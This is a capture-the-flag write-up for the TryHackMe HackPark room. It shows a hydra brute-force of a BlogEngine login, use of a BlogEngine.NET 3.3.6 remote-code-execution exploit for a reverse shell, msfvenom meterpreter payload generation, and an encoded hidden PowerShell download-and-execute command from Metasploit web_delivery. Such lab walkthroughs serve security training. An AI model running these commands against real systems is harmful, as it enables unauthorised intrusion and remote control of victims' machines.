# HackPark

https://tryhackme.com/room/hackpark

## Resources

## Scanning/Enumeration

went to `http://$TARGET_IP`

```sh
nmap -v -T4 -A $TARGET_IP -Pn -oN nmap.txt
# port 80 - Microsoft IIS 8.5

gobuster dir -u $TARGET_IP -w /usr/share/wordlists/dirb/common.txt > gobuster.txt
```

```txt
tried login, interesting request body

ctl00$MainContent$LoginUser$UserName "admin"
ctl00$MainContent$LoginUser$Password "test"
```

## Exploit

### Part 1 - BlogEngine Vulnerability

hint says username is admin

```sh
hydra $TARGET_IP http-form-post \
  "/Account/login.aspx:__VIEWSTATE=ly0aH6bXL2Dm6CbAlybLIF8R7RtrMOPBVE%2Bdq5fW%2FIfjXsn0bfHBlVO83VKJMsC%2B95tiNQtqJcCd%2BV3akdtfSSgBf4vYKIcju5ePAWEMJ8jchoTT9SLJArkSAbKSayeqB3%2BVohdpU2qAwXWIBwHgsMVHiiPeDw1JFLQwEJoNcmDRfd%2BxdWpqwsZnYYoDInZjiQHAy0TRxHBZXTUZfgAY2PyUvE%2FTZjaNzgMjUaGiokt9f39o3w0Tc0shdimoIsGOh5dPgRQg7sctMbVEVnoopYjPGlFbCfnCaTIg1n1qUlo%2B1uoO2b8EBdIf94B%2BGxbSC4oaD%2BXymUsAkkQw4mrilCjgguF8qqC1Dt2rQfLTJc2pIrMY&__EVENTVALIDATION=Gs1Kx18vnWKThU3KKzE7Y1655BprfCPPMkoCrudB74DioCGvOa%2BJ3K%2FUl1vKNOl66KRHtKhcPZka1pt2VFwQYKc2Mz8DBT3D%2B%2F52CmKH7z4xng7blZA2PzWK%2B5ZGmaPQESrhtknNPWggtFy6rsSGRS%2BLrkWh1Fjo%2FyCmc8pXrj8dkRU5&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" \
  -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  -vV -f -w 30

# creds admin:1qaz2wsx
```

logged in as admin, found BlogEngine 3.3.6.0

looked up exploit, found [BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/46353)

renamed exploit file to `PostView.ascx`, replaced IP and port with attacker data

made new post, uploaded `PostView.ascx` to file manager

ran `nc -lvnp 9000` on attacker

went to `http://$TARGET_IP/?theme=../../App_Data/files`; reverse shell started

ran `whoami` in reverse shell; `iis apppool\blog`

### Part 2 - Meterpreter

```sh
# attacker

# Generate reverse shell payload
msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=$ATTACKER_IP LPORT=9002 -f exe -o enki.exe

# setup handler
msfconsole
use exploit/multi/handler
set LHOST $ATTACKER_IP
set LPORT 9002

# serve exploit
python3 -m http.server
```

```batch
REM  target; reverse shell from part 1

REM  download and start reverse shell
POWERSHELL Invoke-WebRequest -Uri http://$ATTACKER_IP:8000/enki.exe -Outfile enki.exe
enki.exe
```

```sh
msfconsole
use exploit/multi/script/web_delivery
set LHOST $ATTACKER_IP
set LPORT 9010
set target 2
run
```

```batch
REM run on target
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB1AFIAUQA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJAB1AFIAUQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHUAUgBRAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANgAuADEALgAxADgAMQA6ADgAMAA4ADAALwBQAFAAQwBSAGwAaQBiAC8AeABtAHQAYQA5AGMAaQB0AGwATwBZADIAUwBSAEUAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADYALgAxAC4AMQA4ADEAOgA4ADAAOAAwAC8AUABQAEMAUgBsAGkAYgAnACkAKQA7AA==


```

## Post-Exploit








